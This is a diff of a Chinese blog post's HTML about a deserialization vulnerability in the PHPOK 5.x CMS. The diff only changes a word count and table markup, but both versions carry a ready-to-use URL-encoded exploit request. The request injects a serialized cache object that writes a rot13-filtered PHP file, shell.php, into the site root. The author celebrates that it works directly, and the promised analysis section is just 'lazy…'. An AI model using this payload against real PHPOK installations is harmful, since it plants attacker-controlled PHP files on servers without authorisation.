@@ -85,7 +85,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    1.6k
+                    1.5k
                 </span>
                 
                 
@@ -126,7 +126,7 @@
     <div class='main'>
         <div class="content markdown animated fadeIn">
             <p>最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。<br><a id="more"></a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></figure></p>
 <p><a href="https://download.phpok.com/5.4.zip" target="_blank" rel="noopener">https://download.phpok.com/5.4.zip</a></p>
 <p>可以直接打，真爽，打完之后会在根目录下生成一个shell.php<br><img src="/2019/12/11/phpok5-x-反序列化漏洞/phpok5-x-反序列化漏洞\shell.php" alt></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>lazy…….</p>
